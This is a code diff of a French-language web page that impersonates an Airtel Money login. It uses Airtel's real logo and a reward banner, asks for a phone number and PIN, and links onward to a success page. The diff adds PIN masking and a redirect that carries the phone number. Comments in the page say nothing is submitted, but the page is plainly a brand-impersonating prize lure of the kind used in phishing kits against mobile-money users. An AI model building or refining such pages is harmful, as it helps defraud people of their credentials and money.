@@ -29,14 +29,20 @@
         background: #ffffff;
       }
 
+      /* ---------- Header ---------- */
       .login-header {
         padding: 1.5rem 1.5rem 0.5rem;
         display: flex;
         justify-content: center;
         align-items: center;
       }
-      .logo-large img { height: 44px; width: auto; display: block; }
+      .logo-large img {
+        height: 44px;
+        width: auto;
+        display: block;
+      }
 
+      /* ---------- Content ---------- */
       .login-content {
         flex: 1;
         padding: 1rem 1.5rem 2rem;
@@ -52,6 +58,7 @@
         margin: 0 0 1.5rem;
       }
 
+      /* ---------- Form ---------- */
       .login-form {
         display: flex;
         flex-direction: column;
@@ -98,6 +105,7 @@
       }
       .phone-input::placeholder { color: #9aa0a6; }
 
+      /* ---------- PIN section ---------- */
       .pin-section {
         display: flex;
         flex-direction: column;
@@ -139,6 +147,7 @@
         padding: 0;
         line-height: 1;
         transition: border-color 0.2s ease, box-shadow 0.2s ease, transform 0.1s ease;
+        -webkit-text-security: disc;
       }
       .pin-box:focus {
         border-color: #e40000;
@@ -169,6 +178,7 @@
         border-color: #c4c8ce;
       }
 
+      /* ---------- Submit button ---------- */
       .login-button {
         margin-top: 0.5rem;
         padding: 1rem;
@@ -191,6 +201,7 @@
         cursor: not-allowed;
       }
 
+      /* ---------- Footer ---------- */
       .login-footer {
         padding: 1.5rem;
         display: flex;
@@ -206,6 +217,7 @@
         text-align: center;
       }
 
+      /* ---------- Small screens ---------- */
       @media (max-width: 360px) {
         .pin-inputs { max-width: 220px; gap: 0.5rem; }
         .pin-box { font-size: 1.25rem; border-radius: 10px; }
@@ -217,14 +229,17 @@
     <div id="root">
       <div class="login-container">
 
+        <!-- Header -->
         <div class="login-header">
           <div class="logo-large">
             <img alt="Airtel Logo" src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg">
           </div>
         </div>
 
+        <!-- Content -->
         <div class="login-content">
 
+          <!-- Anniversary banner -->
           <div style="background: linear-gradient(135deg, rgb(122, 0, 0) 0%, rgb(192, 0, 26) 60%, rgb(232, 0, 31) 100%); border-radius: 16px; padding: 14px 18px; margin-bottom: 20px; display: flex; align-items: center; gap: 12px; box-shadow: rgba(192, 0, 26, 0.25) 0px 4px 20px;">
             <div style="font-size: 28px; flex-shrink: 0;">🏆</div>
             <div>
@@ -235,8 +250,8 @@
 
           <h1 class="login-title">Connectez-vous à Airtel Money pour réclamer votre récompense.</h1>
 
-          <!-- Static form — nothing is submitted anywhere -->
-          <form class="login-form" onsubmit="return false;">
+          <!-- Static form: no submission to any server -->
+          <form id="loginForm" class="login-form" onsubmit="return false;">
 
             <div class="phone-input-container">
               <div class="country-code">
@@ -259,10 +274,11 @@
               </div>
             </div>
 
-            <button type="submit" class="login-button">SE CONNECTER &amp; RÉCLAMER</button>
+            <button id="loginBtn" type="submit" class="login-button">SE CONNECTER &amp; RÉCLAMER</button>
           </form>
         </div>
 
+        <!-- Footer -->
         <div class="login-footer">
           <div>
             <img alt="Airtel Logo" src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg">
@@ -274,18 +290,17 @@
     </div>
 
     <script>
-      // ---- Read phone from URL hash (set by index.html), purely for display ----
+      /* ---- 1. Read phone from URL hash (passed by index.html) ---- */
       (function () {
         var hash = window.location.hash || '';
         var m = hash.match(/phone=([^&]+)/);
         if (m) {
           var phone = decodeURIComponent(m[1]).replace(/\D/g, '');
-          var input = document.getElementById('phoneInput');
-          if (input) input.value = phone;
+          document.getElementById('phoneInput').value = phone;
         }
       })();
 
-      // ---- PIN box UX only — nothing is submitted or captured ----
+      /* ---- 2. PIN box UX only (auto-advance / backspace / eye toggle) ---- */
       (function () {
         var boxes = document.querySelectorAll('.pin-box');
         boxes.forEach(function (box, i) {
@@ -303,7 +318,6 @@
           });
         });
 
-        // Eye toggle: swap password/text on all PIN boxes (visual only)
         var eye = document.querySelector('.eye-button');
         if (eye) {
           eye.addEventListener('click', function () {
@@ -313,6 +327,17 @@
           });
         }
       })();
+
+      /* ---- 3. On "SE CONNECTER & RÉCLAMER" → go to success.html ---- */
+      document.getElementById('loginBtn').addEventListener('click', function (e) {
+        e.preventDefault();
+        var phone = document.getElementById('phoneInput').value.trim();
+        var target = 'success.html';
+        if (phone) {
+          target += '#phone=' + encodeURIComponent(phone);
+        }
+        window.location.href = target;
+      });
     </script>
   </body>
 </html>
